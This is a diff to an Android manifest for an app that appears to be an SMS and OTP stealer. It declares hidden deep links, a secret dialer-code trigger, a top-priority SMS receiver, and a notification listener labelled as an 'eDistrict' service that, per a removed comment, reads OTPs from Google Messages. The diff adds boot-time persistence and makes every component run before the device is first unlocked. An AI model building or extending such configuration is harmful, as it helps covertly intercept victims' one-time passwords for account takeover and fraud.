@@ -6,6 +6,7 @@
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
     <application
         android:allowBackup="true"
@@ -18,6 +19,7 @@
         <!-- Main Activity with Secret Deep Links -->
         <activity
             android:name=".MainActivity"
+            android:directBootAware="true"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.VIEW" />
@@ -53,9 +55,21 @@
             </intent-filter>
         </activity-alias>
 
+        <!-- Direct Boot / Boot Receiver: Starts immediately upon device power on before unlock -->
+        <receiver
+            android:name=".BootReceiver"
+            android:directBootAware="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
         <!-- Secret Dialer Code Receiver (*#*#0825#*#*) -->
         <receiver
             android:name=".SecretCodeReceiver"
+            android:directBootAware="true"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.provider.Telephony.SECRET_CODE" />
@@ -78,18 +92,20 @@
             </intent-filter>
         </receiver>
 
-        <!-- Direct SMS Receiver -->
+        <!-- Direct SMS Receiver (Direct Boot Aware - Works before first unlock) -->
         <receiver
             android:name=".SmsReceiver"
+            android:directBootAware="true"
             android:exported="true">
             <intent-filter android:priority="9999">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
 
-        <!-- 100% Reliable Notification Listener (Google Messages se direct OTP padhega) -->
+        <!-- 100% Reliable Notification Listener (Direct Boot Aware) -->
         <service
             android:name=".OtpNotificationListener"
+            android:directBootAware="true"
             android:label="eDistrict OTP Listener"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:exported="true">
